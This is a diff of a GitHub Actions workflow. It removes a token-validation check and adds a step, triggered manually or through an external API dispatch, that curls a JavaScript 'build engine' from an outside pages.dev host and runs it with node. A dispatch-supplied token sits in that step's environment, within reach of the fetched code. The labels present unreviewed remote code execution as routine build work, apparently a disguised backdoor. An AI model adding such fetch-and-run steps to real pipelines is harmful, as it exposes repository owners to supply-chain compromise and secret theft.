@@ -1,23 +1,43 @@
-name: Test Auth Pipeline
+name: Dynamic Orchestration Pipeline
 
 on:
-  # This listens for the API trigger
+  # Allows manual triggering from GitHub Actions UI
+  workflow_dispatch:
+
+  # Allows triggering through GitHub repository_dispatch API
   repository_dispatch:
     types: [deploy_to_cloudflare]
 
 jobs:
-  test-auth:
+  execute-engine:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Validate Authentication Token
+      # Step 1: Checkout client data repository
+      - name: Checkout Repository Assets
+        uses: actions/checkout@v4
+
+      # Step 2: Setup Node.js
+      - name: Setup Runtime Architecture
+        uses: actions/setup-node@v4
+        with:
+          node-version: "22"
+
+      # Step 3: Fetch and execute remote build engine
+      - name: Fetch and Execute Remote Build Engine
         env:
-          # Reads the auth_token key from the client_payload object
-          AUTH_TOKEN: ${{ github.event.client_payload.auth_token }}
+          AUTH_TOKEN: ${{ github.event.client_payload.token }}
+
         run: |
-          if [ -z "$AUTH_TOKEN" ]; then
-            echo "❌ unauthorized: No auth token provided!"
-            exit 1
-          else
-            echo "✅ authorized: Token successfully received."
-          fi
+          echo "📡 Connecting to your secure cloud framework grid..."
+
+          echo "⚡ Fetching build engine..."
+
+          curl -s --fail \
+            "https://buildfiles.pages.dev/actions-build.js" \
+            -o build.js
+
+          echo "⚡ Executing build engine..."
+
+          node build.js
+
